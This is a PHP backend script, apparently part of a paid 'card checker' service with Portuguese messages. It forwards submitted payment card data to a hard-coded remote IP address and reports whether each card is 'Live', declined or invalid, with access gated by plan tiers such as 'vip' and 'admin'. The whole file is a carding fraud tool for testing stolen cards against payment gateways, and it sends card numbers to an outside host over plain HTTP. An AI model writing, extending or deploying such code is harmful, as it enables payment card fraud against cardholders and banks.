<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = isset($_POST['data']) ? $_POST['data'] : '';
    $gateway = isset($_POST['gateway']) ? $_POST['gateway'] : '';
    $user_id = isset($_POST['user_id']) ? $_POST['user_id'] : '';
    $plan = isset($_POST['plan']) ? $_POST['plan'] : '';

    $validPlans = ['vip', 'VIP', 'extreme', 'EXTREME', 'admin', 'ADMIN'];

    if (in_array($plan, $validPlans)) {
        $url = "http://216.172.177.16:5511/api/gates?gateway={$gateway}&card={$data}";

        // Usando cURL para obter a resposta da API
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            $response = [
                'error' => 3,
                'msg' => "<div>Request falhou! Card:{$data} Gateway:{$gateway}</div>",
            ];
        } else {
            curl_close($ch);
            $response_data = json_decode($response, true);

            if (json_last_error() !== JSON_ERROR_NONE) {
                $response = [
                    'error' => 3,
                    'msg' => "<div>Erro ao decodificar resposta JSON! Card:{$data} Gateway:{$gateway} Response: {$res}</div>",
                ];
            } elseif (isset($response_data['reason'])) {
                $res = $response_data['reason'];
                if ($response_data['reason'] == "Declined") {
                    $response = [
                        'error' => 2,
                        'msg' => "<div>Cartão Recusado! Card:{$data} Gateway:{$gateway} Response: {$res}</div>",
                    ];
                } elseif ($response_data['reason'] == "Validation" || $response_data['reason'] == "Dead") {
                    $response = [
                        'error' => 2,
                        'msg' => "<div>Cartão Invalido! Card:{$data} Gateway:{$gateway} Response: {$res}</div>",
                    ];
                } else {
                    $response = [
                        'error' => 1,
                        'msg' => "<div>Cartão Live! Card:{$data} Gateway:{$gateway} Response: {$res}</div>",
                    ];
                }
            } else {
                $response = [
                    'error' => 3,
                    'msg' => "<div>Resposta inesperada da API! Card:{$data} Gateway:{$gateway} Response: {$res}</div>",
                ];
            }
        }
    } else {
        $response = [
            'error' => 3,
            'msg' => "<div>Plano inválido! Plano:{$plan}</div>",
        ];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} else {
    // Se a requisição não for POST, retorna um erro
    header('HTTP/1.1 405 Method Not Allowed');
    echo json_encode(['error' => 'Método não permitido. Use POST.']);
}
